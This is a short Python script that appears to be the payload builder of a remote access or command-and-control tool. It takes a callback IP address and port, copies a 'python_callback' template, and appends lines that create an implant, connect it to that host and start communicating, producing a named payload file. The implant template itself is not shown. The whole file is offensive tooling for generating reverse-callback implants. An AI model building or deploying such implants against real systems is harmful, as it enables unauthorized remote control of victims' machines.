import argparse

parser = argparse.ArgumentParser()
parser.add_argument("--ip", required=True, help="The IP address for the implant to call back to")
parser.add_argument("--port", required=True, help="The Port for the implant to call back too")
parser.add_argument("--name", required=True, help="what you want to name the payload")
args = parser.parse_args()

with open("src/payload_templates/python_callback.py") as file:
    with open(f"payloads/{args.name}", "w") as payload:
        for line in file:
            payload.write(line)
        payload.write(f"my_implant = implant('{args.ip}', {args.port})\n")
        payload.write("my_implant.connect()\n")
        payload.write("my_implant.intro()\n")
        payload.write("my_implant.communicate()\n")
